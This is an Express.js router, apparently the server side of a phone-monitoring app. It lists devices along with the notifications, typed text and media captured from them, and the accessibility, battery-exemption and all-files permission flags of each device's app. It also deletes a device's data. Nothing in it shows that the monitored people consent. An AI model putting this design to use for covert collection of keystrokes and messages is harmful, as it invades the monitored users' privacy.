import { Router } from 'express'
import { db } from '../db/client.js'
import { deleteImage } from '../cloudinary.js'
import { isOnline, pickActiveRole } from '../appRoles.js'

const router = Router()

// GET /api/devices — distinct devices for the dashboard selector
router.get('/', async (_req, res) => {
    try {
        const [result, statusResult] = await Promise.all([
            db.query(
                `SELECT id, id AS name, MAX(last_seen) AS last_seen, SUM(cnt)::int AS notification_count
                 FROM (
                     SELECT device_id AS id, MAX(received_at) AS last_seen, COUNT(*) AS cnt
                     FROM notifications
                     GROUP BY device_id
                     UNION ALL
                     SELECT device_id AS id, MAX(captured_at) AS last_seen, COUNT(*) AS cnt
                     FROM typed_text
                     GROUP BY device_id
                     UNION ALL
                     SELECT device_id AS id, MAX(received_at) AS last_seen, COUNT(*) AS cnt
                     FROM media_captures
                     GROUP BY device_id
                     UNION ALL
                     SELECT device_id AS id, MAX(last_seen) AS last_seen, 0 AS cnt
                     FROM app_status
                     GROUP BY device_id
                 ) d
                 GROUP BY id
                 ORDER BY last_seen DESC`
            ),
            db.query(
                `SELECT device_id, app_role, package_name, app_label, version_name,
                        listener_enabled, accessibility_enabled, battery_exempt,
                        media_enabled, all_files_access, last_seen
                 FROM app_status
                 ORDER BY device_id, app_role`
            ),
        ])

        const byDevice = new Map()
        for (const row of statusResult.rows) {
            if (!byDevice.has(row.device_id)) byDevice.set(row.device_id, [])
            byDevice.get(row.device_id).push(row)
        }

        const now = Date.now()
        const devices = result.rows.map(d => {
            const rawApps = byDevice.get(d.id) ?? []
            return {
                ...d,
                activeNotificationRole: pickActiveRole(rawApps, 'notification'),
                activeTextRole: pickActiveRole(rawApps, 'text'),
                apps: rawApps.map(a => ({
                    role: a.app_role,
                    packageName: a.package_name,
                    appLabel: a.app_label,
                    versionName: a.version_name,
                    listenerEnabled: a.listener_enabled,
                    accessibilityEnabled: a.accessibility_enabled,
                    batteryExempt: a.battery_exempt,
                    mediaEnabled: a.media_enabled,
                    allFilesAccess: a.all_files_access,
                    lastSeen: a.last_seen,
                    online: isOnline(a.last_seen, now),
                })),
            }
        })
        return res.json(devices)
    } catch (err) {
        console.error('GET /api/devices error:', err.message)
        return res.status(500).json({ error: 'Internal server error' })
    }
})

// DELETE /api/devices/:id — permanently remove a device and all its data
router.delete('/:id', async (req, res) => {
    const { id } = req.params
    try {
        const images = await db.query(
            'SELECT image_url FROM notifications WHERE device_id = $1 AND image_url IS NOT NULL',
            [id]
        )
        const media = await db.query(
            'SELECT media_url FROM media_captures WHERE device_id = $1 AND media_url IS NOT NULL',
            [id]
        )
        const [notifResult, textResult, mediaResult, statusResult] = await Promise.all([
            db.query('DELETE FROM notifications WHERE device_id = $1', [id]),
            db.query('DELETE FROM typed_text WHERE device_id = $1', [id]),
            db.query('DELETE FROM media_captures WHERE device_id = $1', [id]),
            db.query('DELETE FROM app_status WHERE device_id = $1', [id]),
        ])
        images.rows.forEach(row => deleteImage(row.image_url))
        media.rows.forEach(row => deleteImage(row.media_url))
        return res.json({
            deleted: notifResult.rowCount + textResult.rowCount + mediaResult.rowCount,
            notifications: notifResult.rowCount,
            typedText: textResult.rowCount,
            media: mediaResult.rowCount,
            appStatus: statusResult.rowCount,
        })
    } catch (err) {
        console.error('DELETE /api/devices/:id error:', err.message)
        return res.status(500).json({ error: 'Internal server error' })
    }
})

export default router
